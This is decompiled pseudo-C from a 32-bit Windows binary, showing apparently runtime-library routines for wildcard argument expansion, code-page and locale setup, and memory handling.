int32_t function_40ca96(int32_t a1, int32_t a2) {
    if (a2 == 0) {
        // 0x40caa6
        *(int32_t *)function_40b091() = 22;
        // 0x40cc14
        return 22;
    }
    // 0x40cabc
    int32_t v1; // bp-48, 0x40ca96
    int32_t v2 = &v1; // 0x40cac2
    int32_t * v3 = (int32_t *)a2; // 0x40cac3
    *v3 = 0;
    int32_t v4 = 0; // bp-36, 0x40cac9
    v4 = 0;
    int16_t v5; // bp-8, 0x40ca96
    if (*(int32_t *)a1 != 0) {
        int32_t * v6 = (int32_t *)(v2 - 4); // 0x40cadf
        int32_t v7 = &v5; // 0x40cadf
        int32_t * v8 = (int32_t *)(v2 - 8); // 0x40cae0
        int32_t * v9 = (int32_t *)(v2 - 12);
        int32_t v10 = a1; // 0x40cb1d
        v5 = 0x3f2a;
        *v6 = v7;
        int32_t * v11 = (int32_t *)v10; // 0x40cae0
        *v8 = *v11;
        int32_t v12 = function_40f760(0x3f2a, 0); // 0x40cae5
        *v6 = (int32_t)&v4;
        int32_t v13; // 0x40ca96
        int32_t v14; // 0x40cb0b
        int32_t v15; // 0x40cafa
        if (v12 != 0) {
            // 0x40cb04
            *v8 = v12;
            *v9 = *v11;
            v14 = function_40ccbc((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v13 = v14;
        } else {
            // 0x40caf0
            *v8 = 0;
            *v9 = 0;
            *(int32_t *)(v2 - 16) = *v11;
            v15 = function_40cc26((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v13 = v15;
        }
        int32_t result = v13; // 0x40cb17
        while (v13 == 0) {
            // 0x40cb1d
            v10 += 4;
            if (*(int32_t *)v10 == 0) {
                // 0x40cb26
                goto lab_0x40cb2c;
            }
            v5 = 0x3f2a;
            *v6 = v7;
            v11 = (int32_t *)v10;
            *v8 = *v11;
            v12 = function_40f760(0x3f2a, 0);
            *v6 = (int32_t)&v4;
            if (v12 != 0) {
                // 0x40cb04
                *v8 = v12;
                *v9 = *v11;
                v14 = function_40ccbc((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                v13 = v14;
            } else {
                // 0x40caf0
                *v8 = 0;
                *v9 = 0;
                *(int32_t *)(v2 - 16) = *v11;
                v15 = function_40cc26((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                v13 = v15;
            }
            // 0x40cb13
            result = v13;
        }
        // 0x40cc08
        function_40ce40();
        // 0x40cc14
        return result;
    }
    goto lab_0x40cb2c;
  lab_0x40cb2c:
    // 0x40cb2c
    v5 = 0;
    uint32_t v16 = 3 - v4; // 0x40cb39
    int32_t v17 = 0; // 0x40cb4e
    int32_t v18 = 0; // 0x40cb4e
    int32_t v19 = 0; // 0x40cb4e
    if (v4 == 0 && v16 >= 4) {
        int32_t v20 = *(int32_t *)v17; // 0x40cb54
        int16_t v21 = (int16_t)v20 + 1; // 0x40cb59
        v5 = v21;
        int32_t v22 = v20;
        int32_t v23 = v22 + 1; // 0x40cb5e
        while (*(char *)v22 != 0) {
            // 0x40cb5c
            v22 = v23;
            v23 = v22 + 1;
        }
        int32_t v24 = 1 + v23 - (int32_t)v21; // 0x40cb6a
        int32_t v25 = 1; // 0x40cb6f
        int32_t v26 = v25; // 0x40cb75
        v17 += 4;
        int32_t v27 = v24; // 0x40cb75
        while (v25 != v16 / 4) {
            // 0x40cb54
            v20 = *(int32_t *)v17;
            v21 = (int16_t)v20 + 1;
            v5 = v21;
            v22 = v20;
            v23 = v22 + 1;
            while (*(char *)v22 != 0) {
                // 0x40cb5c
                v22 = v23;
                v23 = v22 + 1;
            }
            // 0x40cb63
            v24 = v27 + 1 + v23 - (int32_t)v21;
            v25 = v26 + 1;
            v26 = v25;
            v17 += 4;
            v27 = v24;
        }
        // 0x40cb77
        v5 = v24;
        v18 = 0x10000 * v24 / 0x10000;
        v19 = v25;
    }
    int32_t v28 = -v4 / 4 + 1; // 0x40cb3f
    int32_t * v29 = (int32_t *)(v2 - 4); // 0x40cb80
    *v29 = 1;
    int32_t * v30 = (int32_t *)(v2 - 8); // 0x40cb82
    *v30 = v18;
    int32_t * v31 = (int32_t *)(v2 - 12); // 0x40cb85
    *v31 = v28;
    int32_t v32 = function_40a3df(v19, v18, (int32_t)&g266); // 0x40cb86
    int32_t result2 = -1; // 0x40cb92
    if (v32 != 0) {
        if (v4 != 0) {
            int32_t v33 = v32 + 4 * v28; // 0x40cb9c
            int32_t * v34 = (int32_t *)(v2 - 16);
            int32_t v35 = v33; // 0x40cbaf
            int32_t v36 = v4; // 0x40cbaf
            int32_t * v37 = (int32_t *)v36; // 0x40cbb2
            int32_t v38 = *v37; // 0x40cbb2
            int32_t v39 = v38;
            int32_t v40 = v39 + 1; // 0x40cbbf
            while (*(char *)v39 != 0) {
                // 0x40cbba
                v39 = v40;
                v40 = v39 + 1;
            }
            int32_t v41 = v39 - v38 + 1; // 0x40cbc4
            *v29 = v41;
            *v30 = *v37;
            *v31 = v33 - v35 + (int32_t)v5;
            *v34 = v35;
            while (function_40f74b(v41) == 0) {
                // 0x40cbe3
                *(int32_t *)(v32 - v4 + v36) = v35;
                v36 += 4;
                v35 += v41;
                if (v36 == 0) {
                    goto lab_0x40cbf9;
                }
                v37 = (int32_t *)v36;
                v38 = *v37;
                v39 = v38;
                v40 = v39 + 1;
                while (*(char *)v39 != 0) {
                    // 0x40cbba
                    v39 = v40;
                    v40 = v39 + 1;
                }
                // 0x40cbc1
                v41 = v39 - v38 + 1;
                *v29 = v41;
                *v30 = *v37;
                *v31 = v33 - v35 + (int32_t)v5;
                *v34 = v35;
            }
            // 0x40cc19
            *v29 = 0;
            *v30 = 0;
            *v31 = 0;
            *v34 = 0;
            *(int32_t *)(v2 - 20) = 0;
            function_409c20();
            return __asm_int3();
        }
      lab_0x40cbf9:
        // 0x40cbf9
        *v3 = v32;
        result2 = 0;
    }
    // 0x40cc00
    *v29 = 0;
    function_40c15c((int32_t)&g266);
    // 0x40cc08
    function_40ce40();
    // 0x40cc14
    return result2;
}

// Address range: 0x40cc26 - 0x40ccbc
int32_t function_40cc26(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1; // 0x40cc2f
    while (*(char *)v1 != 0) {
        // 0x40cc32
        v1++;
    }
    uint32_t v2 = v1 - a1 + 1; // 0x40cc42
    if (v2 > (a3 ^ -1)) {
        // 0x40ccaa
        return 12;
    }
    int32_t v3 = function_40ca21(a3 + 1 + v2, 1); // 0x40cc5b
    if (a3 != 0) {
        // 0x40cc68
        if (function_40f74b(v3) != 0) {
            // 0x40ccaf
            function_409c20();
            return __asm_int3();
        }
    }
    // 0x40cc7a
    if (function_40f74b(v3 + a3) != 0) {
        // 0x40ccaf
        function_409c20();
        return __asm_int3();
    }
    int32_t result = function_40ce65(v3); // 0x40cc97
    function_40c15c(0);
    // 0x40ccaa
    return result;
}

// Address range: 0x40ccbc - 0x40ce40
int32_t function_40ccbc(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40ccbc
    int32_t v1; // bp-352, 0x40ccbc
    int32_t v2 = &v1; // 0x40ccdc
    int32_t v3 = a2; // 0x40cd00
    if (a2 != a1) {
        int32_t v4 = a2; // 0x40ccbc
        while (true) {
          lab_0x40cce5:
            // 0x40cce5
            v3 = v4;
            int32_t v5; // 0x40ccbc
            switch (*(char *)v5) {
                case 47: {
                    goto lab_0x40cd02;
                }
                case 92: {
                    goto lab_0x40cd02;
                }
                case 58: {
                    goto lab_0x40cd02;
                }
                default: {
                    // 0x40ccf3
                    *(int32_t *)(v2 - 4) = v4;
                    *(int32_t *)(v2 - 8) = a1;
                    int32_t v6 = function_40f7a0((int32_t)&g266, (int32_t)&g266); // 0x40ccf5
                    v4 = v6;
                    if (v6 == a1) {
                        // break -> 0x40cd02
                        break;
                    }
                    goto lab_0x40cce5;
                }
            }
        }
    }
  lab_0x40cd02:;
    char v7 = *(char *)v3; // 0x40cd02
    if (v3 != a1 + 1 && v7 == 58) {
        // 0x40cd10
        *(int32_t *)(v2 - 4) = a3;
        *(int32_t *)(v2 - 8) = 0;
        *(int32_t *)(v2 - 12) = 0;
        *(int32_t *)(v2 - 16) = a1;
        function_40cc26((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        // 0x40cd9a
        return function_406b2c();
    }
    int32_t * v8; // 0x40ccbc
    int32_t v9; // 0x40ccbc
    switch (v7) {
        case 47: {
        }
        case 92: {
            int32_t * v10 = (int32_t *)(v2 - 4); // 0x40cd40
            *v10 = 320;
            v8 = v10;
            v9 = 1 - a1 + v3;
            // break ->
            break;
        }
        default: {
            int32_t * v11 = (int32_t *)(v2 - 4); // 0x40cd40
            *v11 = 320;
            v8 = v11;
            v9 = v7 != 58 ? 0 : 1 - a1 + v3;
            // break ->
            break;
        }
    }
    int32_t * v12 = (int32_t *)(v2 - 8); // 0x40cd55
    *v12 = 0;
    int32_t * v13 = (int32_t *)(v2 - 12); // 0x40cd56
    int32_t v14; // bp-328, 0x40ccbc
    int32_t v15 = &v14; // 0x40cd56
    *v13 = v15;
    function_407730(v9, (int32_t)&g266, (int32_t)&g266);
    *v8 = 0;
    *v12 = 0;
    *v13 = 0;
    *(int32_t *)(v2 - 16) = v15;
    *(int32_t *)(v2 - 20) = 0;
    int32_t v16 = v2 - 24; // 0x40cd6a
    *(int32_t *)v16 = a1;
    int32_t * v17 = FindFirstFileExA((char *)&g266, (int32_t)&g266, &g266, (int32_t)&g266, &g266, (int32_t)&g266); // 0x40cd6b
    if (v17 == (int32_t *)-1) {
        // 0x40cd8c
        *(int32_t *)(v2 - 28) = a3;
        *(int32_t *)(v2 - 32) = 0;
        *(int32_t *)(v2 - 36) = 0;
        *(int32_t *)(v2 - 40) = a1;
        function_40cc26((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        // 0x40cd9a
        return function_406b2c();
    }
    int32_t v18 = (int32_t)v17; // 0x40cd6b
    int32_t * v19 = (int32_t *)(a3 + 4); // 0x40cdab
    int32_t * v20 = (int32_t *)a3; // 0x40cdae
    int32_t v21 = *v19 - *v20; // 0x40cdae
    int32_t v22 = v21 / 4; // 0x40cdb0
    int32_t v23 = v16; // 0x40cdb3
    int32_t v24; // 0x40ccbc
    while (true) {
        int32_t v25 = v23;
        int32_t * v26 = (int32_t *)(v25 - 4);
        int32_t v27; // 0x40ccbc
        int32_t * v28; // 0x40ccbc
        char v29; // bp-284, 0x40ccbc
        char v30; // 0x40ccbc
        char v31; // 0x40ccbc
        if ((v31 == 0 || v30 == 0 == v31 == 46) == v29 == 46) {
            int32_t v32 = v25 - 8; // 0x40cdfc
            v28 = (int32_t *)v32;
            v27 = v32;
        } else {
            // 0x40cdda
            *v26 = a3;
            int32_t v33 = v25 - 8;
            int32_t * v34 = (int32_t *)v33;
            *v34 = v9;
            *(int32_t *)(v25 - 12) = a1;
            *(int32_t *)(v25 - 16) = (int32_t)&v29;
            int32_t v35 = function_40cc26((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40cde9
            v24 = v25;
            v28 = v34;
            v27 = v33;
            if (v35 != 0) {
                // break -> 0x40cd91
                break;
            }
        }
        int32_t v36 = v27;
        *v26 = v15;
        *v28 = v18;
        bool v37 = FindNextFileA(&g266, (struct _WIN32_FIND_DATAA *)&g266); // 0x40cdfd
        v23 = v36;
        if (!v37) {
            int32_t v38 = *v20; // 0x40ce0d
            int32_t v39 = (*v19 - v38) / 4; // 0x40ce1a
            v24 = v36;
            if (v39 == v22) {
                goto lab_0x40cd91;
            } else {
                // 0x40ce25
                *(int32_t *)(v25 - 12) = 0x40ca7e;
                *(int32_t *)(v25 - 16) = 4;
                *(int32_t *)(v25 - 20) = v39 - v22;
                *(int32_t *)(v25 - 24) = v38 + (v21 & -4);
                function_40f300((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                v24 = v36;
                goto lab_0x40cd91;
            }
        }
    }
  lab_0x40cd91:
    // 0x40cd91
    *(int32_t *)(v24 - 4) = v18;
    FindClose(&g266);
    // 0x40cd9a
    return function_406b2c();
}

// Address range: 0x40ce40 - 0x40ce65
int32_t function_40ce40(void) {
    // 0x40ce40
    int32_t v1; // 0x40ce40
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40ce55
    int32_t v3; // bp-8, 0x40ce40
    int32_t * v4 = (int32_t *)((int32_t)&v3 - 4);
    if (v1 == *v2) {
        // 0x40ce5a
        int32_t v5; // 0x40ce40
        *v4 = v5;
        return function_40c15c((int32_t)&g266);
    }
    int32_t v6; // 0x40ce40
    *v4 = *(int32_t *)v6;
    function_40c15c((int32_t)&g266);
    int32_t v7 = v6 + 4; // 0x40ce52
    while (v7 != *v2) {
        // 0x40ce4a
        *v4 = *(int32_t *)v7;
        function_40c15c((int32_t)&g266);
        v7 += 4;
    }
    // 0x40ce5a
    return function_40c15c((int32_t)&g266);
}

// Address range: 0x40ce65 - 0x40ce9a
int32_t function_40ce65(int32_t a1) {
    // 0x40ce65
    int32_t v1; // 0x40ce65
    int32_t v2; // 0x40ce65
    int32_t v3; // 0x40ce65
    int32_t result = function_40ce9a(v1, v2, v3); // 0x40ce6e
    if (result == 0) {
        // 0x40ce86
        int32_t v4; // 0x40ce65
        int32_t * v5 = (int32_t *)(v4 + 4); // 0x40ce86
        *(int32_t *)*v5 = a1;
        *v5 = *v5 + 4;
    } else {
        // 0x40ce79
        function_40c15c(a1);
    }
    // 0x40ce94
    return result;
}

// Address range: 0x40ce9a - 0x40cf21
int32_t function_40ce9a(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40ce9a
    int32_t v1; // 0x40ce9a
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40cea0
    int32_t v3 = *v2; // 0x40cea0
    int32_t * v4 = (int32_t *)(v1 + 4); // 0x40cea3
    if (*v4 != v3) {
        // 0x40cf1e
        return 0;
    }
    if (v1 == 0) {
        // 0x40ceb1
        *(int32_t *)v1 = function_40ca21(4, 4);
        function_40c15c(0);
        // 0x40cf1e
        return 12;
    }
    int32_t v5 = v3 - v1; // 0x40cedc
    int32_t v6 = v5 / 4; // 0x40cede
    if (v6 >= 0x7fffffff) {
        // 0x40cf1e
        return 12;
    }
    int32_t v7 = function_40d87c(v1, 2 * v6, 4); // 0x40cef2
    int32_t result = 12; // 0x40cefc
    if (v7 != 0) {
        // 0x40cf03
        *(int32_t *)v1 = v7;
        *v4 = v7 + (v5 & -4);
        *v2 = v7 + 8 * v6;
        result = 0;
    }
    // 0x40cf13
    function_40c15c(0);
    // 0x40cf1e
    return result;
}

// Address range: 0x40cf21 - 0x40cf2c
int32_t function_40cf21(int32_t a1, int32_t * a2) {
    // 0x40cf21
    return function_40ca96((int32_t)&g266, (int32_t)&g266);
}

// Address range: 0x40cf2c - 0x40cf63
int32_t function_40cf2c(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40cf2c
    function_406cf0(&g101, 8, (int32_t)&g266);
    int32_t v1; // 0x40cf2c
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40cf43
    *v2 = 0;
    function_40cf97();
    *v2 = -2;
    function_40cf63();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40cf5b
    return result;
}

// Address range: 0x40cf63 - 0x40cf6f
int32_t function_40cf63(void) {
    // 0x40cf63
    int32_t v1; // 0x40cf63
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40cf6f - 0x40cf97
int32_t function_40cf6f(int32_t a1, int32_t * a2) {
    int32_t v1 = a1; // bp-12, 0x40cf7d
    int32_t v2 = a1; // bp-16, 0x40cf80
    int32_t v3; // 0x40cf6f
    return function_40cf2c(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40cf97 - 0x40d05b
int32_t function_40cf97(void) {
    // 0x40cf97
    int32_t v1; // 0x40cf97
    int32_t * v2 = (int32_t *)(v1 + 72); // 0x40cfa2
    g216 = *(int32_t *)(*v2 + 4);
    g217 = *(int32_t *)(*v2 + 8);
    g215 = *(int32_t *)(*v2 + 540);
    function_40d6b7(&g218, 12, *v2 + 12, 12);
    function_40d6b7(&g129, 257, *(int32_t *)329 + 24, 257);
    function_40d6b7(&g130, 256, *(int32_t *)328 + 281, 256);
    int32_t v3 = (int32_t)g133; // 0x40d02a
    *g133 = (int32_t)&g132;
    int32_t v4 = v3; // 0x40d02e
    if (g133 == (int32_t *)1) {
        // 0x40d030
        v4 = v3;
        if (g133 != &g131) {
            int32_t v5 = (int32_t)g133; // 0x40d030
            function_40c15c(v5);
            v4 = v5;
        }
    }
    int32_t * v6 = (int32_t *)(v4 + 72); // 0x40d047
    *(int32_t *)&g133 = *v6;
    int32_t result = *v6; // 0x40d053
    int32_t * v7 = (int32_t *)result; // 0x40d056
    *v7 = *v7 + 1;
    return result;
}

// Address range: 0x40d05b - 0x40d099
int32_t function_40d05b(int32_t a1) {
    int32_t result = (int32_t)L"ja-JP"; // 0x40d05b
    switch (a1) {
        case 936: {
            // 0x40d079
            return (int32_t)L"zh-CN";
        }
        default: {
            int32_t v1 = a1 - 949; // 0x40d06f
            result = (int32_t)L"ko-KR";
            if (v1 != 0) {
                // 0x40d074
                result = v1 == 1 ? (int32_t)L"zh-TW" : 0;
            }
        }
        case 932: {
            // 0x40d079
            return result;
        }
    }
}

// Address range: 0x40d099 - 0x40d10c
int32_t function_40d099(int32_t a1) {
    // 0x40d099
    function_409954(0, (int32_t)&g266);
    g219 = 0;
    int32_t result; // 0x40d099
    if (a1 != -2) {
        if (a1 != -3) {
            // 0x40d0e3
            result = a1;
            if (a1 == -4) {
                // 0x40d0e8
                g219 = 1;
                int32_t v1; // 0x40d099
                result = *(int32_t *)(v1 + 8);
            }
        } else {
            // 0x40d0d1
            g219 = 1;
            result = GetACP();
        }
    } else {
        // 0x40d0ba
        g219 = 1;
        result = GetOEMCP();
    }
    // 0x40d0f8
    char v2; // 0x40d099
    if (v2 != 0) {
        // 0x40d0fe
        int32_t v3; // 0x40d099
        int32_t * v4 = (int32_t *)(v3 + 848); // 0x40d101
        *v4 = *v4 & -3;
    }
    // 0x40d108
    return result;
}

// Address range: 0x40d10c - 0x40d171
int32_t function_40d10c(int32_t a1) {
    int32_t v1 = a1 + 24; // 0x40d11e
    function_407730(v1, 0, 257);
    *(int32_t *)(a1 + 4) = 0;
    *(int32_t *)(a1 + 8) = 0;
    *(int32_t *)(a1 + 540) = 0;
    int32_t v2 = a1 + 12; // 0x40d13e
    *(int32_t *)v2 = 0;
    bool v3; // 0x40d10c
    int32_t v4 = v3 ? -4 : 4; // 0x40d141
    int32_t v5 = v4 + v2; // 0x40d141
    *(int32_t *)v5 = 0;
    *(int32_t *)(v5 + v4) = 0;
    int32_t v6 = (int32_t)&g131 - a1; // 0x40d149
    int32_t v7 = 257; // 0x40d149
    int32_t v8 = v1;
    *(char *)v8 = *(char *)(v8 + v6);
    v7--;
    int32_t v9 = v8 + 1; // 0x40d154
    while (v7 != 0) {
        // 0x40d14b
        v8 = v9;
        *(char *)v8 = *(char *)(v8 + v6);
        v7--;
        v9 = v8 + 1;
    }
    int32_t result = 0; // 0x40d15c
    int32_t v10 = a1 + 281; // 0x40d15c
    int32_t v11 = 256; // 0x40d15c
    unsigned char v12 = *(char *)(v10 + v6); // 0x40d161
    result = result & -256 | (int32_t)v12;
    *(char *)v10 = v12;
    v11--;
    v10++;
    while (v11 != 0) {
        // 0x40d161
        v12 = *(char *)(v10 + v6);
        result = result & -256 | (int32_t)v12;
        *(char *)v10 = v12;
        v11--;
        v10++;
    }
    // 0x40d16c
    return result;
}

// Address range: 0x40d171 - 0x40d305
int32_t function_40d171(int32_t a1) {
    int32_t * CodePage = (int32_t *)(a1 + 4); // 0x40d193
    int32_t v1; // 0x40d171
    int32_t v2; // 0x40d171
    int32_t lpCPInfo; // bp-1820, 0x40d171
    if (!GetCPInfo(*CodePage, (struct _cpinfo *)&lpCPInfo)) {
        int32_t v3 = a1 + 25;
        v1 = 0;
        while (true) {
          lab_0x40d2ae:
            // 0x40d2ae
            v2 = v1;
            int32_t v4 = a1 + 281 + v2; // 0x40d2ae
            if (v2 < 91) {
                char * v5 = (char *)(v2 + v3); // 0x40d2c0
                *v5 = *v5 | 16;
                // 0x40d2dd
                *(char *)v4 = (char)(v2 + 32);
                goto lab_0x40d2e3;
            } else {
                if (v2 < 123) {
                    char * v6 = (char *)(v2 + v3); // 0x40d2d6
                    *v6 = *v6 | 32;
                    // 0x40d2dd
                    *(char *)v4 = (char)(v2 - 32);
                    goto lab_0x40d2e3;
                } else {
                    // 0x40d2e1
                    *(char *)v4 = 0;
                    goto lab_0x40d2e3;
                }
            }
        }
      lab_0x40d2f4_2:
        // 0x40d2f4
        return function_406b2c();
    }
    // 0x40d1ad
    int32_t v7; // bp-4, 0x40d171
    int32_t v8 = &v7; // 0x40d174
    int32_t v9 = v8 - 260; // 0x40d1ad
    int32_t v10 = 0;
    *(char *)(v10 + v9) = (char)v10;
    int32_t v11 = v10 + 1; // 0x40d1b4
    while (v11 != 256) {
        // 0x40d1ad
        v10 = v11;
        *(char *)(v10 + v9) = (char)v10;
        v11 = v10 + 1;
    }
    char v12 = 32; // bp-264, 0x40d1c5
    char v13; // bp-1814, 0x40d171
    if (v13 != 0) {
        int32_t v14 = &v13; // 0x40d1e8
        uint32_t v15 = (int32_t)*(char *)(v14 + 1); // 0x40d1ce
        int32_t v16 = ((int32_t)v13 | 256) & 255; // 0x40d1d2
        int32_t v17 = v16; // 0x40d1e6
        uint32_t v18; // 0x40d171
        int32_t v19; // 0x40d1e3
        if (v16 <= v15) {
            v18 = v17;
            *(char *)(v18 + v9) = 32;
            v19 = v18 + 1;
            while (v18 < v15 && v19 < 256) {
                // 0x40d1db
                v18 = v19;
                *(char *)(v18 + v9) = 32;
                v19 = v18 + 1;
            }
        }
        // 0x40d1e8
        v14 += 2;
        unsigned char v20 = *(char *)v14; // 0x40d1eb
        while (v20 != 0) {
            // 0x40d1ce
            v15 = (int32_t)*(char *)(v14 + 1);
            v16 = (int32_t)v20 & 255;
            v17 = v16;
            if (v16 <= v15) {
                v18 = v17;
                *(char *)(v18 + v9) = 32;
                v19 = v18 + 1;
                while (v18 < v15 && v19 < 256) {
                    // 0x40d1db
                    v18 = v19;
                    *(char *)(v18 + v9) = 32;
                    v19 = v18 + 1;
                }
            }
            // 0x40d1e8
            v14 += 2;
            v20 = *(char *)v14;
        }
    }
    // 0x40d1f1
    int32_t v21; // bp-1800, 0x40d171
    function_40e23d(0, 1, &v12, 256, &v21, *CodePage, 0);
    int32_t * v22 = (int32_t *)(a1 + 540); // 0x40d221
    int32_t v23; // bp-520, 0x40d171
    function_40f0e8(0, *v22, 256, &v12, 256, &v23, 256, *CodePage, 0);
    int32_t v24; // bp-776, 0x40d171
    function_40f0e8(0, *v22, 512, &v12, 256, &v24, 256, *CodePage, 0);
    int32_t v25 = a1 + 25;
    int32_t v26 = a1 + 281;
    int32_t v27 = 0; // 0x40d258
    int32_t v28; // 0x40d171
    int32_t v29; // 0x40d171
    while (true) {
      lab_0x40d25a:
        // 0x40d25a
        v28 = v27;
        int16_t v30 = *(int16_t *)(v8 - 1796 + 2 * v28); // 0x40d25a
        if ((v30 & 1) == 0) {
            if ((v30 & 2) == 0) {
                // 0x40d28d
                *(char *)(v26 + v28) = 0;
                goto lab_0x40d294;
            } else {
                char * v31 = (char *)(v28 + v25); // 0x40d278
                *v31 = *v31 | 32;
                v29 = v28 + v8 - 772;
                goto lab_0x40d284;
            }
        } else {
            char * v32 = (char *)(v28 + v25); // 0x40d266
            *v32 = *v32 | 16;
            v29 = v28 + v8 - 516;
            goto lab_0x40d284;
        }
    }
  lab_0x40d2e3:;
    int32_t v33 = v2 + 1; // 0x40d2ef
    v1 = v33;
    if (v33 == 256) {
        return function_406b2c();
    }
    goto lab_0x40d2ae;
  lab_0x40d284:
    // 0x40d284
    *(char *)(v26 + v28) = *(char *)v29;
    goto lab_0x40d294;
  lab_0x40d294:
    // 0x40d294
    v27 = v28 + 1;
    if (v27 == 256) {
        // break -> 0x40d2f4
        goto lab_0x40d2f4_2;
    }
    goto lab_0x40d25a;
}

// Address range: 0x40d305 - 0x40d406
int32_t function_40d305(int32_t a1, int32_t a2) {
    int32_t v1 = function_40bfb3();
    int32_t v2 = v1; // bp-8, 0x40d312
    function_40d424(v1);
    int32_t v3 = function_40d099(a1); // 0x40d31d
    int32_t v4 = v3; // bp-16, 0x40d326
    int32_t * v5 = (int32_t *)(v1 + 72);
    if (v3 == *(int32_t *)(*v5 + 4)) {
        // 0x40d388
        return 0;
    }
    int32_t v6 = function_40c196(544); // 0x40d33d
    int32_t result = -1; // 0x40d34a
    int32_t v7 = 0; // 0x40d34a
    if (v6 != 0) {
        // 0x40d34c
        __asm_rep_movsd_memcpy((char *)v6, (char *)*v5, 136);
        int32_t * v8 = (int32_t *)v6; // 0x40d35f
        *v8 = 0;
        int32_t v9 = function_40d4c6(v3, v6); // 0x40d362
        if (v9 != -1) {
            if ((char)a2 == 0) {
                // 0x40d392
                function_40ad17();
            }
            int32_t * v10 = (int32_t *)*(int32_t *)(v2 + 72); // 0x40d39d
            int32_t v11 = *v10; // 0x40d39d
            *v10 = v11 - 1;
            if (v11 == 1) {
                int32_t v12 = *(int32_t *)(v2 + 72); // 0x40d3a7
                if (v12 != (int32_t)&g131) {
                    // 0x40d3b0
                    function_40c15c(v12);
                }
            }
            // 0x40d3b9
            *v8 = 1;
            *(int32_t *)(v2 + 72) = v6;
            result = v9;
            v7 = 0;
            if ((*(char *)(v2 + 848) & 2) == 0) {
                // 0x40d3d5
                result = v9;
                v7 = 0;
                if ((g139 & 1) == 0) {
                    // 0x40d3de
                    v4 = &v2;
                    function_40cf6f(5, &v4);
                    result = v9;
                    v7 = 0;
                    if ((char)a2 != 0) {
                        // 0x40d3f7
                        *(int32_t *)&g123 = (int32_t)g133;
                        result = v9;
                        v7 = 0;
                    }
                }
            }
        } else {
            // 0x40d36f
            *(int32_t *)function_40b091() = 22;
            result = -1;
            v7 = v6;
        }
    }
    // 0x40d37c
    int32_t v13; // bp-28, 0x40d305
    *(int32_t *)((int32_t)&v13 - 4) = v7;
    function_40c15c((int32_t)&g266);
    // 0x40d388
    return result;
}

// Address range: 0x40d406 - 0x40d424
int32_t function_40d406(void) {
    // 0x40d406
    int32_t v1; // 0x40d406
    if (g220 == 0) {
        int32_t v2 = function_40d305(-3, 1); // 0x40d413
        g220 = 1;
        v1 = v2;
    }
    // 0x40d421
    return v1 & -256 | 1;
}

// Address range: 0x40d424 - 0x40d4c6
int32_t function_40d424(int32_t a1) {
    // 0x40d424
    function_406cf0(&g100, 12, (int32_t)&g266);
    int32_t v1; // 0x40d424
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40d432
    *v2 = 0;
    int32_t v3 = function_40bfb3(); // 0x40d435
    int32_t v4; // 0x40d424
    if ((*(int32_t *)(v3 + 848) & (int32_t)g139) == 0) {
        goto lab_0x40d45b;
    } else {
        // 0x40d44a
        if (*(int32_t *)(v3 + 76) == 0) {
            goto lab_0x40d45b;
        } else {
            // 0x40d44f
            v4 = *(int32_t *)(v3 + 72);
            goto lab_0x40d452;
        }
    }
  lab_0x40d45b:
    // 0x40d45b
    function_40c527(5);
    int32_t * v5 = (int32_t *)(v1 - 4); // 0x40d463
    *v5 = 0;
    int32_t * v6 = (int32_t *)(v3 + 72); // 0x40d466
    int32_t v7 = *v6; // 0x40d466
    *v2 = v7;
    int32_t v8 = v7; // 0x40d472
    if (v7 != (int32_t)g133) {
        if (v7 != 0) {
            int32_t * v9 = (int32_t *)v7; // 0x40d47b
            int32_t v10 = *v9 - 1; // 0x40d47b
            *v9 = v10;
            if (v7 != (int32_t)&g131 && v10 == 0) {
                // 0x40d489
                function_40c15c(v7);
            }
        }
        // 0x40d490
        *v6 = (int32_t)g133;
        int32_t v11 = (int32_t)g133; // 0x40d498
        *v2 = v11;
        *g133 = (int32_t)"dB";
        v8 = v11;
    }
    // 0x40d4a4
    *v5 = -2;
    function_40d4b5();
    v4 = v8;
    goto lab_0x40d452;
  lab_0x40d452:
    // 0x40d452
    if (v4 != 0) {
        int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40d4c0
        return result;
    }
    // 0x40d456
    function_40af0b();
    // UNREACHABLE
}

// Address range: 0x40d4b5 - 0x40d4be
int32_t function_40d4b5(void) {
    // 0x40d4b5
    return function_40c56f(5);
}

// Address range: 0x40d4c6 - 0x40d6b7
int32_t function_40d4c6(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-48, 0x40d4da
    int32_t CodePage = function_40d099(a1); // 0x40d4e0
    if (CodePage == 0) {
        // 0x40d4ec
        v1 = a2;
        function_40d10c(a2);
        // 0x40d6a7
        return function_406b2c();
    }
    int32_t v2 = 0; // 0x40d50a
    int32_t v3 = 0; // 0x40d50a
    int32_t v4; // bp-60, 0x40d4c6
    if (g126 == CodePage) {
        goto lab_0x40d5fa;
      lab_0x40d5fa:;
        int32_t v5 = a2 + 24; // 0x40d5ff
        v4 = v5;
        function_407730(v5, 0, 257);
        int32_t v6 = 0;
        int32_t v7 = v3 + (int32_t)&g128;
        char v8 = *(char *)v7; // 0x40d61c
        unsigned char v9; // 0x40d62a
        int32_t v10; // 0x40d4c6
        uint32_t v11; // 0x40d4c6
        char * v12; // 0x40d4c6
        char * v13; // 0x40d623
        unsigned char v14; // 0x40d623
